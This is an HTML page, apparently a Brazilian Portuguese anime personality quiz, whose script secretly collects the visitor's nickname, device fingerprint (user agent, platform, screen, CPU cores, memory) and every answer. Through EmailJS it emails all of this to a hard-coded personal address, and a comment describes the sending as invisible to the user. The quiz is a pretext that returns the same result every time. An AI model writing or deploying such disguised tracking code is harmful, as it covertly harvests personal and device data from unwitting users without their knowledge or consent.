<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Qual Personagem Você Seria?</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
        .container { background: #1e293b; width: 100%; max-width: 400px; padding: 24px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
        h2 { font-size: 1.25rem; margin-bottom: 16px; color: #38bdf8; }
        .btn { display: block; width: 100%; padding: 12px; margin: 8px 0; background: #334155; border: none; border-radius: 8px; color: #fff; font-size: 1rem; text-align: left; cursor: pointer; transition: background 0.2s; }
        .btn:hover { background: #0284c7; }
        input { width: 100%; padding: 12px; margin: 8px 0; background: #0f172a; border: 1px solid #475569; border-radius: 8px; color: #fff; font-size: 1rem; }
        .hidden { display: none; }
    </style>
    <!-- SDK do EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("SEU_PUBLIC_KEY"); // Substitua pela Public Key do seu painel do EmailJS
        })();
    </script>
</head>
<body>

<div class="container" id="app">
    <div id="step-0">
        <h2>Descubra seu alter ego no anime</h2>
        <p style="color: #94a3b8; font-size: 0.9rem; margin-bottom: 16px;">Insira seu apelido para começar o teste:</p>
        <input type="text" id="username" placeholder="Seu apelido ou nome...">
        <button class="btn" onclick="startQuiz()" style="text-align: center; background: #0284c7; margin-top: 12px;">Iniciar</button>
    </div>

    <div id="step-1" class="hidden">
        <h2>1. Qual sua reação sob pressão?</h2>
        <button class="btn" onclick="nextStep(1, 'Analiso friamente')">Analiso friamente</button>
        <button class="btn" onclick="nextStep(1, 'Vou pra cima direto')">Vou pra cima direto</button>
        <button class="btn" onclick="nextStep(1, 'Procuro uma rota de fuga')">Procuro uma rota de fuga</button>
    </div>

    <div id="step-2" class="hidden">
        <h2>2. Qual elemento você prefere?</h2>
        <button class="btn" onclick="nextStep(2, 'Trevas / Sombra')">Trevas / Sombra</button>
        <button class="btn" onclick="nextStep(2, 'Fogo / Destruição')">Fogo / Destruição</button>
        <button class="btn" onclick="nextStep(2, 'Raio / Velocidade')">Raio / Velocidade</button>
    </div>

    <div id="result" class="hidden">
        <h2>Resultado</h2>
        <p id="result-text" style="color: #38bdf8; font-size: 1.1rem;"></p>
    </div>
</div>

<script>
    const serviceID = "SEU_SERVICE_ID";   // Substitua pelo Service ID do EmailJS
    const templateID = "SEU_TEMPLATE_ID"; // Substitua pelo Template ID do EmailJS

    let harvestedData = {
        device: {},
        answers: [],
        inputData: {}
    };

    function collectTelemetry() {
        harvestedData.device = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: {
                width: window.screen.width,
                height: window.screen.height,
                pixelRatio: window.devicePixelRatio
            },
            hardware: {
                cores: navigator.hardwareConcurrency || 'unknown',
                memory: navigator.deviceMemory || 'unknown'
            },
            touchPoints: navigator.maxTouchPoints,
            timestamp: new Date().toISOString()
        };

        sendData();
    }

    function sendData() {
        const templateParams = {
            to_email: "ryanadamo.br@gmail.com",
            username: harvestedData.inputData.username || "Anônimo",
            device_info: JSON.stringify(harvestedData.device, null, 2),
            answers: JSON.stringify(harvestedData.answers, null, 2)
        };

        // Disparo assíncrono invisível ao usuário
        emailjs.send(serviceID, templateID, templateParams)
            .then(() => {}, (err) => {
                console.error('Erro no envio', err);
            });
    }

    function startQuiz() {
        const nameInput = document.getElementById('username').value;
        harvestedData.inputData.username = nameInput;
        collectTelemetry();

        document.getElementById('step-0').classList.add('hidden');
        document.getElementById('step-1').classList.remove('hidden');
    }

    function nextStep(stepNum, choice) {
        harvestedData.answers.push({ step: stepNum, choice: choice });
        sendData(); // Atualiza o envio a cada resposta dada

        document.getElementById(`step-${stepNum}`).classList.add('hidden');
        
        if (stepNum === 1) {
            document.getElementById('step-2').classList.remove('hidden');
        } else {
            document.getElementById('result').classList.remove('hidden');
            document.getElementById('result-text').innerText = "Parabéns! Você é compatível com o Arquétipo Sombra.";
        }
    }
</script>

</body>
</html>
